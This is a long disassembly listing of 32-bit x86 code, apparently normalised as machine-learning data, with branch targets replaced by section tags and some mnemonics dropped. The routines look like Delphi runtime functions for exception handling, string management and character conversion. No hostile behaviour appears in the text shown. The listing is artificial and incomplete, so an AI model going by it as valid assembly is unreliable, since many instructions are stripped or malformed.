jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_4033d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_403454
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_403464
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40345b
lea eax [ ebp - 0x8 ]
call sub_405ab8
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_4033a0
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_405ad0
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_403464
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_4034a8
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_403530
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4034e8
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_403518
push eax
push ecx
mov eax [ eax ]
call sub_4034e8
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_404088
call [ rw-data ]
sub_403560
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_4034e8
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_403588
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_4035d8
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
xor ecx ecx
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov cx [ esi ]
add esi 0x2
mov eax [ eax ]
mov [ edi ] al
jmp r-xdata
add esi 0x6
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
mov bx [ esi ]
add esi ebx
dec ecx
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edx [ esi + 0x2 ]
je r-xdata
sub_403618
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_403668
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_403691
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_4036fc
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_403738
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_40374c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403760
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_403780
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_403760
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_4037e4
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_403250
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_4061e8
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_40374c
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_4036fc
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_403910
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_403250
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_4036fc
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_4061e8
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_403738
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402c90
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_403a98
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_403780
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_403ad0
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_404088
sub_403af8
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_4061e8
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_40331c
call sub_4036e0
sub_403b4c
call sub_4061e8
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_40331c
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_4037a8
jmp edx
sub_403b94
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4027f0
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403cf4
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403d1c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403d62
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403d7c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403dc2
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403e1c
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405f7c
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403e40
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405f7c
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403e68
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403e8c
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403ee8
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403f18
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_40125c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_401214
push eax
call sub_401234
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_401214
push eax
call sub_401234
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403fa4
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403e8c
call sub_403f18
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403d1c
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403cf4
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_405a48
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403ee8
push eax
call sub_401274
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_404094
push ebp
mov ebp esp
call sub_403250
push ebp
xor ecx ecx
push r-xdata
mov edx [ fs : ecx ]
push edx
mov [ fs : ecx ] esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ecx
push edx
call sub_40270c
pop edx
pop eax
call edx
xor edx edx
pop ecx
mov [ fs : edx ] ecx
pop ecx
pop ebp
pop ebp
retn 0x4
sub_4040cc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0x8
call sub_4026ec
mov [ eax ] edi
mov edx [ ebp + 0x10 ]
mov [ eax + 0x4 ] edx
mov [ rw-data ] 0x1
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax sub_404094
push eax
push esi
push ebx
call sub_401244
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_404118
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_40270c
pop eax
sub_40413c
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_40270c
sub_40416c
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_4041dc
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4028e8
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_40270c
sub_4041b0
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_40270c
sub_4041dc
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4026ec
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_404208
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_4041dc
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_404118
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4028e8
sub_404238
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_404258
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call MultiByteToWideChar
pop ebp
retn 0x4
sub_404274
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404118
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_404764
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404238
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_404238
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404764
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404208
jmp r-xdata
sub_404310
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404208
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_404340
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404274
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404388
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_404208
not ecx
sub_4043b4
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4028e8
pop ebx
retn
mov ecx ebx
sub_4043e0
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_40416c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_404764
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_404764
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4028e8
pop edi
pop esi
pop ebx
retn
sub_404424
test edx edx
je r-xdata
mov edx ecx
jmp sub_40416c
test ecx ecx
je sub_40416c
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_4043e0
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_4041dc
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4028e8
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4028e8
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_40416c
pop edx
pop eax
jmp sub_4043e0
call sub_40416c
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_404498
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_4041dc
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_404764
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4028e8
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_40416c
dec [ edx - 0x8 ]
sub_404524
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_4045e4
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_4041dc
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4028e8
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_40270c
sub_404638
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_404118
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_404208
jmp r-xdata
pop ebx
retn 0x4
sub_404678
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_4045e4#2
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4028e8
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_404764
mov edi ecx
sub_4046c0
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
